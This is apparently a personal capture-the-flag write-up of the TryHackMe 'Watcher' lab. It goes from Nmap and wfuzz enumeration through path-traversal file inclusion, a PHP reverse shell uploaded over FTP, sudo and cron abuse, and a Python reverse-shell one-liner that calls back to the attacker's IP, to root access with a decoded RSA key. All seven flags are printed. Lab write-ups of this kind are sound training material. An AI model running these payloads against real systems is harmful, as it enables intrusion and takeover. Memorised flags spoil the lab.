
![](Tryhackme/Linux/Watcher/attachments/Pasted%20image%2020240415181929.png)



>ip addr `10.10.65.41`

# Date 15-04-24 || Rohit Tiwari


>-INFO:

>OS: Ubuntu Linux

>web-technology: Apache httpd 2.4.29,Ruby

>Credential (any):

## Nmap scan 
```bash

┌──(dedrknex㉿kali)-[~/oscp/Tryhackme/watcher_10.10.65.41]
└─$ sudo nmap -sVC -v -A $ip -T4 -oN Watcher_nmap_scan    
[sudo] password for dedrknex: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-15 18:48 IST
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 18:48
Completed NSE at 18:48, 0.00s elapsed
Initiating NSE at 18:48
Completed NSE at 18:48, 0.00s elapsed
Initiating NSE at 18:48
Completed NSE at 18:48, 0.00s elapsed
Initiating Ping Scan at 18:48
Scanning 10.10.65.41 [4 ports]
Completed Ping Scan at 18:48, 0.23s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 18:48
Completed Parallel DNS resolution of 1 host. at 18:49, 13.01s elapsed
Initiating SYN Stealth Scan at 18:49
Scanning 10.10.65.41 [1000 ports]
Discovered open port 22/tcp on 10.10.65.41
Discovered open port 21/tcp on 10.10.65.41
Discovered open port 80/tcp on 10.10.65.41
Completed SYN Stealth Scan at 18:49, 2.42s elapsed (1000 total ports)
Initiating Service scan at 18:49
Scanning 3 services on 10.10.65.41
Completed Service scan at 18:49, 6.41s elapsed (3 services on 1 host)
Initiating OS detection (try #1) against 10.10.65.41
Retrying OS detection (try #2) against 10.10.65.41
Retrying OS detection (try #3) against 10.10.65.41
Retrying OS detection (try #4) against 10.10.65.41
Retrying OS detection (try #5) against 10.10.65.41
Initiating Traceroute at 18:49
Completed Traceroute at 18:49, 0.20s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 18:49
Completed Parallel DNS resolution of 2 hosts. at 18:49, 13.00s elapsed
NSE: Script scanning 10.10.65.41.
Initiating NSE at 18:49
Completed NSE at 18:49, 5.91s elapsed
Initiating NSE at 18:49
Completed NSE at 18:49, 1.48s elapsed
Initiating NSE at 18:49
Completed NSE at 18:49, 0.00s elapsed
Nmap scan report for 10.10.65.41
Host is up (0.19s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e1:80:ec:1f:26:9e:32:eb:27:3f:26:ac:d2:37:ba:96 (RSA)
|   256 36:ff:70:11:05:8e:d4:50:7a:29:91:58:75:ac:2e:76 (ECDSA)
|_  256 48:d2:3e:45:da:0c:f0:f6:65:4e:f9:78:97:37:aa:8a (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: Jekyll v4.1.1
|_http-title: Corkplacemats
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=4/15%OT=21%CT=1%CU=42299%PV=Y%DS=2%DC=T%G=Y%TM=661D
OS:2973%P=x86_64-pc-linux-gnu)SEQ(SP=109%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)
OS:OPS(O1=M508ST11NW6%O2=M508ST11NW6%O3=M508NNT11NW6%O4=M508ST11NW6%O5=M508
OS:ST11NW6%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)
OS:ECN(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%
OS:F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T
OS:5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=
OS:Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF
OS:=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40
OS:%CD=S)

Uptime guess: 23.104 days (since Sat Mar 23 16:19:52 2024)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=265 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```







## Port 80

on port 80 found a simple webserver

![](Tryhackme/Linux/Watcher/attachments/Pasted%20image%2020240415184523.png)

on some enumeration found a robots.txt 

![](Tryhackme/Linux/Watcher/attachments/Pasted%20image%2020240415184611.png)

## found flag 1

![](Tryhackme/Linux/Watcher/attachments/Pasted%20image%2020240415184744.png)


and /secreet_file_do_not_read.txt

403 forbidden

![](Tryhackme/Linux/Watcher/attachments/Pasted%20image%2020240415184819.png)




on fuzzing with wfuzz

```bash
┌──(dedrknex㉿kali)-[~/oscp/Tryhackme/watcher_10.10.65.41]
└─$ wfuzz -c -z file,/usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt --hc 404 -t 100 "http://$ip/FUZZ" 

 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.65.41/FUZZ
Total requests: 20476

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                 
=====================================================================

000000016:   403        9 L      28 W       276 Ch      ".htaccess"                             
000000017:   403        9 L      28 W       276 Ch      ".htpasswd"                             
000005518:   301        9 L      28 W       308 Ch      "css"                                   
000009380:   301        9 L      28 W       311 Ch      "images"                                
000015556:   200        3 L      6 W        69 Ch       "robots.txt"                            
000016220:   403        9 L      28 W       276 Ch      "server-status" 
```

# IntialFoothold

>on inspecting the source code of the webpage found a POST.php confirmed php and also index.php rediractes to the home page

![](Tryhackme/Linux/Watcher/attachments/Pasted%20image%2020240415190537.png)


on visting to the POST.php

![](Tryhackme/Linux/Watcher/attachments/Pasted%20image%2020240415190707.png)


after post=? put <http://10.10.65.41/post.php?post=../../../../etc/passwd>


![](Tryhackme/Linux/Watcher/attachments/Pasted%20image%2020240415190840.png)


![](Tryhackme/Linux/Watcher/attachments/Pasted%20image%2020240415190803.png)


## Confirmed LFI


Now need to escalate to get Shell

rember that /secret_file_do_not_read.txt file found in robots.txt which was inaccesible now let's try to access

![](Tryhackme/Linux/Watcher/attachments/Pasted%20image%2020240415192641.png)

### That secret file

>found in = </post.php?post=../../../var/www/html//secret_file_do_not_read.txt> 

```bash
 Hi Mat,

The credentials for the FTP server are below. I've set the files to be saved to /home/ftpuser/ftp/files.

Will

----------

ftpuser:givemefiles777
```

## Got cred of ftp  let's try to access

#### logged into FTP

```bash

┌──(dedrknex㉿kali)-[~/oscp/Tryhackme/watcher_10.10.65.41]
└─$ ftp $ip
Connected to 10.10.65.41.
220 (vsFTPd 3.0.3)
Name (10.10.65.41:dedrknex): ftpuser        
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||45651|)
150 Here comes the directory listing.
drwxr-xr-x    2 1001     1001         4096 Dec 03  2020 files
-rw-r--r--    1 0        0              21 Dec 03  2020 flag_2.txt
226 Directory send OK.
ftp> 

```

# Flag2

```python

┌──(dedrknex㉿kali)-[~/oscp/Tryhackme/watcher_10.10.65.41]
└─$ cat flag_2.txt        
FLAG{ftp_you_and_me}

```

# using the ftp as a way for shell

```bash
──(dedrknex㉿kali)-[~/oscp/Tryhackme/watcher_10.10.65.41]
└─$ echo "helllo world" > hello.txt

ftp> put hello.txt 
local: hello.txt remote: hello.txt
229 Entering Extended Passive Mode (|||47877|)
150 Ok to send data.
100% |*******************************************|    13      211.58 KiB/s    00:00 ETA
226 Transfer complete.


```

![](Tryhackme/Linux/Watcher/attachments/Pasted%20image%2020240415194524.png)


now time to get the revshell

```bash

┌──(dedrknex㉿kali)-[~/oscp/Tryhackme/watcher_10.10.65.41]
└─$ vi shell.php


put the penestmonkey revshell


ftp> put shell.php 
local: shell.php remote: shell.php
229 Entering Extended Passive Mode (|||42573|)
150 Ok to send data.
100% |*******************************************|  2593       38.04 MiB/s    00:00 ETA
226 Transfer complete.
2593 bytes sent in 00:00 (5.54 KiB/s)

```

![](Tryhackme/Linux/Watcher/attachments/Pasted%20image%2020240415195245.png)

![](Tryhackme/Linux/Watcher/attachments/Pasted%20image%2020240415195313.png)

![](Tryhackme/Linux/Watcher/attachments/Pasted%20image%2020240415195335.png)

### Flag3

```
toby@watcher:/var/www/html$ ls
bunch.php   images               post.php    secret_file_do_not_read.txt
css         index.php            robots.txt  striped.php
flag_1.txt  more_secrets_a9f10a  round.php
toby@watcher:/var/www/html$ cd more_secrets_a9f10a/
toby@watcher:/var/www/html/more_secrets_a9f10a$ ls
flag_3.txt
toby@watcher:/var/www/html/more_secrets_a9f10a$ cat flag_3.txt 
FLAG{lfi_what_a_guy}
```

on toby dir found a note.txt

```bash

www-data@watcher:/home/toby$ cat note.txt 
Hi Toby,

I've got the cron jobs set up now so don't worry about getting that done.

Mat
www-data@watcher:/home/toby$
```

on sudo -l found

```bash

www-data@watcher:/tmp$ sudo -l
Matching Defaults entries for www-data on watcher:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on watcher:
    (toby) NOPASSWD: ALL
```

```bash

toby@watcher:/home$ id
uid=1003(toby) gid=1003(toby) groups=1003(toby)
toby@watcher:/home$ 

```

### Got flag4
```bash
toby@watcher:~$ ls
flag_4.txt  jobs  note.txt
toby@watcher:~$ cat flag_4.txt 
FLAG{chad_lifestyle}

```

Under mat dir found notes.txt

```bash

toby@watcher:/home/mat$ ls
cow.jpg  flag_5.txt  note.txt  scripts
toby@watcher:/home/mat$ cat note.txt 
Hi Mat,

I've set up your sudo rights to use the python script as my user. You can only run the script with sudo so it should be safe.

Will

```

now we earlier saw that a cron job it set up by matt for toby at cow.sh we will use it to get revshell

![](Tryhackme/Linux/Watcher/attachments/Pasted%20image%2020240415202905.png)

![](Tryhackme/Linux/Watcher/attachments/Pasted%20image%2020240415202918.png)

### Flag 5
```
mat@watcher:~$ cat flag_5.txt
cat flag_5.txt
FLAG{live_by_the_cow_die_by_the_cow}
```


now edit cmd.py scipt

![](Tryhackme/Linux/Watcher/attachments/Pasted%20image%2020240415204843.png)

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);ss
.connect(("10.9.237.141",2929));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os..
dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")

```

```bash

 sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py *


┌──(dedrknex㉿kali)-[~/oscp/Tryhackme/watcher_10.10.65.41]
└─$ nc -lnvp 2929
listening on [any] 2929 ...
connect to [10.9.237.141] from (UNKNOWN) [10.10.65.41] 51420
will@watcher:~/scripts$ 



```

### Flag6

```bash
will@watcher:/home/will$ cat flag_6.txt
cat flag_6.txt
FLAG{but_i_thought_my_script_was_secure}
```

# Now privesc

```bash

will@watcher:/opt/backups$ id 
uid=1000(will) gid=1000(will) groups=1000(will),4(adm)
will@watcher:/opt/backups$ cd /opt/
will@watcher:/opt$ ls
backups
will@watcher:/opt$ cd backups/
will@watcher:/opt/backups$ ls
key.b64
will@watcher:/opt/backups$ cat key.b64 
LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFcEFJQkFBS0NBUUVBelBhUUZvbFFx
OGNIb205bXNzeVBaNTNhTHpCY1J5QncrcnlzSjNoMEpDeG5WK2FHCm9wWmRjUXowMVlPWWRqWUlh
WkVKbWRjUFZXUXAvTDB1YzV1M2lnb2lLMXVpWU1mdzg1ME43dDNPWC9lcmRLRjQKanFWdTNpWE45
ZG9CbXIzVHVVOVJKa1ZuRER1bzh5NER0SXVGQ2Y5MlpmRUFKR1VCMit2Rk9ON3E0S0pzSXhnQQpu
TThrajhOa0ZrRlBrMGQxSEtIMitwN1FQMkhHWnJmM0RORm1RN1R1amEzem5nYkVWTzdOWHgzVjNZ
T0Y5eTFYCmVGUHJ2dERRVjdCWWI2ZWdrbGFmczRtNFhlVU8vY3NNODRJNm5ZSFd6RUo1enBjU3Jw
bWtESHhDOHlIOW1JVnQKZFNlbGFiVzJmdUxBaTUxVVIvMndOcUwxM2h2R2dscGVQaEtRZ1FJREFR
QUJBb0lCQUhtZ1RyeXcyMmcwQVRuSQo5WjVnZVRDNW9VR2padjdtSjJVREZQMlBJd3hjTlM4YUl3
YlVSN3JRUDNGOFY3cStNWnZEYjNrVS80cGlsKy9jCnEzWDdENTBnaWtwRVpFVWVJTVBQalBjVU5H
VUthWG9hWDVuMlhhWUJ0UWlSUjZaMXd2QVNPMHVFbjdQSXEyY3oKQlF2Y1J5UTVyaDZzTnJOaUpR
cEdESkRFNTRoSWlnaWMvR3VjYnluZXpZeWE4cnJJc2RXTS8wU1VsOUprbkkwUQpUUU9pL1gyd2Z5
cnlKc20rdFljdlk0eWRoQ2hLKzBuVlRoZWNpVXJWL3drRnZPRGJHTVN1dWhjSFJLVEtjNkI2CjF3
c1VBODUrdnFORnJ4ekZZL3RXMTg4VzAwZ3k5dzUxYktTS0R4Ym90aTJnZGdtRm9scG5Gdyt0MFFS
QjVSQ0YKQWxRSjI4a0NnWUVBNmxyWTJ4eWVMaC9hT0J1OStTcDN1SmtuSWtPYnBJV0NkTGQxeFhO
dERNQXo0T3FickxCNQpmSi9pVWNZandPQkh0M05Oa3VVbTZxb0VmcDRHb3UxNHlHek9pUmtBZTRI
UUpGOXZ4RldKNW1YK0JIR0kvdmoyCk52MXNxN1BhSUtxNHBrUkJ6UjZNL09iRDd5UWU3OE5kbFF2
TG5RVGxXcDRuamhqUW9IT3NvdnNDZ1lFQTMrVEUKN1FSNzd5UThsMWlHQUZZUlhJekJncDVlSjJB
QXZWcFdKdUlOTEs1bG1RL0UxeDJLOThFNzNDcFFzUkRHMG4rMQp2cDQrWThKMElCL3RHbUNmN0lQ
TWVpWDgwWUpXN0x0b3pyNytzZmJBUVoxVGEybzFoQ2FsQVF5SWs5cCtFWHBJClViQlZueVVDMVhj
dlJmUXZGSnl6Z2Njd0V4RXI2Z2xKS09qNjRiTUNnWUVBbHhteC9qeEtaTFRXenh4YjlWNEQKU1Bz
K055SmVKTXFNSFZMNFZUR2gydm5GdVR1cTJjSUM0bTUzem4reEo3ZXpwYjFyQTg1SnREMmduajZu
U3I5UQpBL0hiakp1Wkt3aTh1ZWJxdWl6b3Q2dUZCenBvdVBTdVV6QThzOHhIVkk2ZWRWMUhDOGlw
NEptdE5QQVdIa0xaCmdMTFZPazBnejdkdkMzaEdjMTJCcnFjQ2dZQWhGamkzNGlMQ2kzTmMxbHN2
TDRqdlNXbkxlTVhuUWJ1NlArQmQKYktpUHd0SUcxWnE4UTRSbTZxcUM5Y25vOE5iQkF0aUQ2L1RD
WDFrejZpUHE4djZQUUViMmdpaWplWVNKQllVTwprSkVwRVpNRjMwOFZuNk42L1E4RFlhdkpWYyt0
bTRtV2NOMm1ZQnpVR1FIbWI1aUpqa0xFMmYvVHdZVGcyREIwCm1FR0RHd0tCZ1FDaCtVcG1UVFJ4
NEtLTnk2d0prd0d2MnVSZGo5cnRhMlg1cHpUcTJuRUFwa2UyVVlsUDVPTGgKLzZLSFRMUmhjcDlG
bUY5aUtXRHRFTVNROERDYW41Wk1KN09JWXAyUloxUnpDOUR1ZzNxa3R0a09LQWJjY0tuNQo0QVB4
STFEeFUrYTJ4WFhmMDJkc1FIMEg1QWhOQ2lUQkQ3STVZUnNNMWJPRXFqRmRaZ3Y2U0E9PQotLS0t
LUVORCBSU0EgUFJJVkFURSBLRVktLS0tLQo=
will@watcher:/opt/backups$ 

```
copy the key.64 and decoded it found

```bash

┌──(dedrknex㉿kali)-[~/oscp/Tryhackme/watcher_10.10.65.41/keys]
└─$ cat key | base64 -d
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAzPaQFolQq8cHom9mssyPZ53aLzBcRyBw+rysJ3h0JCxnV+aG
opZdcQz01YOYdjYIaZEJmdcPVWQp/L0uc5u3igoiK1uiYMfw850N7t3OX/erdKF4
jqVu3iXN9doBmr3TuU9RJkVnDDuo8y4DtIuFCf92ZfEAJGUB2+vFON7q4KJsIxgA
nM8kj8NkFkFPk0d1HKH2+p7QP2HGZrf3DNFmQ7Tuja3zngbEVO7NXx3V3YOF9y1X
eFPrvtDQV7BYb6egklafs4m4XeUO/csM84I6nYHWzEJ5zpcSrpmkDHxC8yH9mIVt
dSelabW2fuLAi51UR/2wNqL13hvGglpePhKQgQIDAQABAoIBAHmgTryw22g0ATnI
9Z5geTC5oUGjZv7mJ2UDFP2PIwxcNS8aIwbUR7rQP3F8V7q+MZvDb3kU/4pil+/c
q3X7D50gikpEZEUeIMPPjPcUNGUKaXoaX5n2XaYBtQiRR6Z1wvASO0uEn7PIq2cz
BQvcRyQ5rh6sNrNiJQpGDJDE54hIigic/GucbynezYya8rrIsdWM/0SUl9JknI0Q
TQOi/X2wfyryJsm+tYcvY4ydhChK+0nVTheciUrV/wkFvODbGMSuuhcHRKTKc6B6
1wsUA85+vqNFrxzFY/tW188W00gy9w51bKSKDxboti2gdgmFolpnFw+t0QRB5RCF
AlQJ28kCgYEA6lrY2xyeLh/aOBu9+Sp3uJknIkObpIWCdLd1xXNtDMAz4OqbrLB5
fJ/iUcYjwOBHt3NNkuUm6qoEfp4Gou14yGzOiRkAe4HQJF9vxFWJ5mX+BHGI/vj2
Nv1sq7PaIKq4pkRBzR6M/ObD7yQe78NdlQvLnQTlWp4njhjQoHOsovsCgYEA3+TE
7QR77yQ8l1iGAFYRXIzBgp5eJ2AAvVpWJuINLK5lmQ/E1x2K98E73CpQsRDG0n+1
vp4+Y8J0IB/tGmCf7IPMeiX80YJW7Ltozr7+sfbAQZ1Ta2o1hCalAQyIk9p+EXpI
UbBVnyUC1XcvRfQvFJyzgccwExEr6glJKOj64bMCgYEAlxmx/jxKZLTWzxxb9V4D
SPs+NyJeJMqMHVL4VTGh2vnFuTuq2cIC4m53zn+xJ7ezpb1rA85JtD2gnj6nSr9Q
A/HbjJuZKwi8uebquizot6uFBzpouPSuUzA8s8xHVI6edV1HC8ip4JmtNPAWHkLZ
gLLVOk0gz7dvC3hGc12BrqcCgYAhFji34iLCi3Nc1lsvL4jvSWnLeMXnQbu6P+Bd
bKiPwtIG1Zq8Q4Rm6qqC9cno8NbBAtiD6/TCX1kz6iPq8v6PQEb2giijeYSJBYUO
kJEpEZMF308Vn6N6/Q8DYavJVc+tm4mWcN2mYBzUGQHmb5iJjkLE2f/TwYTg2DB0
mEGDGwKBgQCh+UpmTTRx4KKNy6wJkwGv2uRdj9rta2X5pzTq2nEApke2UYlP5OLh
/6KHTLRhcp9FmF9iKWDtEMSQ8DCan5ZMJ7OIYp2RZ1RzC9Dug3qkttkOKAbccKn5
4APxI1DxU+a2xXXf02dsQH0H5AhNCiTBD7I5YRsM1bOEqjFdZgv6SA==
-----END RSA PRIVATE KEY-----

```

## Got ssh

```bash

┌──(dedrknex㉿kali)-[~/oscp/Tryhackme/watcher_10.10.65.41/keys]
└─$ chmod 600 id_rsa 
                                                                      
┌──(dedrknex㉿kali)-[~/oscp/Tryhackme/watcher_10.10.65.41/keys]
└─$ ssh -i id_rsa root@$ip
ssh: Could not resolve hostname : Name or service not known
                                                                      
┌──(dedrknex㉿kali)-[~/oscp/Tryhackme/watcher_10.10.65.41/keys]
└─$ ssh -i id_rsa root@10.10.65.41
The authenticity of host '10.10.65.41 (10.10.65.41)' can't be established.
ED25519 key fingerprint is SHA256:/60sf9gTocupkmAaJjtQJTxW1ZnolBZckE6KpPiQi5s.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.65.41' (ED25519) to the list of known hosts.
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-128-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Apr 15 15:35:52 UTC 2024

  System load:  0.0                Processes:             117
  Usage of /:   22.5% of 18.57GB   Users logged in:       0
  Memory usage: 50%                IP address for eth0:   10.10.65.41
  Swap usage:   0%                 IP address for lxdbr0: 10.14.179.1


33 packages can be updated.
0 updates are security updates.


Last login: Thu Dec  3 03:25:38 2020
root@watcher:~# 

```

# Flag7

```bash
oot@watcher:~# cat flag_7.txt 
FLAG{who_watches_the_watchers}

```

Done:)